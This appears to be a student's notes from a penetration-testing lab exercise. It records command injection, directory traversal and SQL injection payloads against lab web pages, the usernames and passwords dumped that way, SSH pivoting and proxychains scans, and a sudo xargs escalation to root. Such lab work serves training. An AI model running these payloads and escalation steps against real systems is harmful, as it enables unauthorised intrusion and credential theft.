HAST-006-M
97dGQEcQWgSxAzo
base64 and rot13 encoding throughout this module
linux - 10.50.31.3
windows - 10.50.44.112

BOX1 - 10.50.41.56

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /share/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

http://10.50.41.56/Onlinetools/tools.php
select story to read is susceptible to command injection
opened the Possible_end.txt to find middle name of President

http://10.50.41.56/share/Untitled_Diagram.png
see network map
192.168.28.0/27
192.168.28.160/27

by doing ";uname -r" the kernel version is  4.15.0-88-generic 

ls -lisa /var/www/html we see there are a total of 5 directoriess
total 36 drwxr-xr-x 2 root root 4096 Dec 9 2021 Onlinetools 
-rw-r--r-- 1 root root 2806 Nov 23 2021 PE2_style.css 
drwxr-xr-x 2 root root 4096 Dec 9 2021 images 
-rw-r--r-- 1 root root 5448 Nov 23 2021 index.html 
drwxr-xr-x 3 root root 4096 Dec 9 2021 newtest 
-rw-r--r-- 1 root root 38 Nov 23 2021 robots.txt 
drwxr-xr-x 2 root root 4096 Dec 9 2021 share 
drwxr-xr-x 2 root root 4096 Oct 16 02:41 stories
drwxr-xr-x 2 root root 4096 Oct 16 02:41 stories


cat /etc/passwd found comment and home directory to perform ssh key using command injection:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
www-data:x:33:33:ApjxpkHuatfcMiuWuxdh:/var/www:/bin/sh 
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
openupthedoor:x:1001:1001::/home/openupthedoor:/bin/bash

total 12 drwxrwxr-x 3 root www-data 4096 Dec 9 2021 . 
drwxr-xr-x 14 root root 4096 Dec 9 2021 .. 
drwxr-xr-x 7 root root 4096 Dec 9 2021 html

got on box through a MS tunnel ssh -MS /tmp/mind www-data@10.50.41.56

www-data@ministry-defense-19:~$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
64 bytes from 192.168.28.30: icmp_seq=1 ttl=64 time=0.573 ms (IGNORE)
64 bytes from 192.168.28.177: icmp_seq=1 ttl=63 time=1.58 ms
64 bytes from 192.168.28.182: icmp_seq=1 ttl=63 time=2.04 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.360 ms (IGNORE)

set up a dynamic tunnel 
ssh -S /tmp/mind mind -O forward -D9050

use proxychains nmap to find ports open on new ips 
`student@lin-ops:~$ proxychains nmap -T4 -Pn -sT -v 192.168.28.177,182`

Nmap scan report for 192.168.28.177
Host is up (0.0015s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.28.182
Host is up (0.0014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

lets look at port 80 on .182
Nmap scan report for 192.168.28.182
Host is up (0.0060s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login/: Login page
|   /robots.txt: Robots file
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

student@lin-ops:~/.ssh$ ssh -S /tmp/mind mind -O forward -L 1500:192.168.28.182:80
launch browser

http://127.0.0.1:1500/Onlinetools/lookup.php? susceptible to directory traversal
../../../../etc/hosts
we find that this device can talk to Defence_Nix1 and find host name resolution question 


http://127.0.0.1:1500/login/loginin.html vulnerable to sql injection
tom' or 1='1
Array
(
    [0] => Msmith
    [name] => Msmith
    [1] => Squanchy
    [password] => Squanchy
)
1Array
(
    [0] => Fpalic
    [name] => Fpalic
    [1] => Birdperson
    [password] => Birdperson
)
1Array
(
    [0] => Kmichae
    [name] => Kmichae
    [1] => MrMeeseeks
    [password] => MrMeeseeks
)

using hyperlink in inital page led to this:
http://127.0.0.1:1500/forces/forcespick.php?Locations=6%20or%201=1
which is suceptible to sql injection

un:Rsanch        pwd:ScaryTerry
un:Msmith        pwd:Squanchy
un:Fpalic        pwd:Birdperson
un:Kmichae       pwd:MrMeeseeks

lets try to brute force either the .177 or .182

student@lin-ops:~/.ssh$ ssh -S /tmp/mind mind -O forward -L 1501:192.168.28.182:22
student@lin-ops:~/.ssh$ ssh -S /tmp/mind mind -O forward -L 1502:192.168.28.177:22

student@lin-ops:~$ ssh Fpalic@127.0.0.1 -p 1502
worked for .177
is the only one that works thus far

sudo -l see can take advantage of xargs
$ sudo xargs -a /root /bin/bash istantly became root hehe

ss -ntlpu found weird 21254 port
tcp      LISTEN     0          1                           0.0.0.0:21254              0.0.0.0:*        users:(("SecurityOnion",pid=1116,fd=3))                                                              
root@defense-nix1-19:/# cat /root/svch0st.sh 
find reference # and nc listener script as we see

root@defense-nix1-19:/home/devops# scp -r RE_this student@10.50.44.112:C:
copied to my windows box, used ghidra to decode it and saw num >> 2 == 21 i used this 
https://bit-calculator.com/bit-shift-calculator to help find that a num that fits the first input is 85 
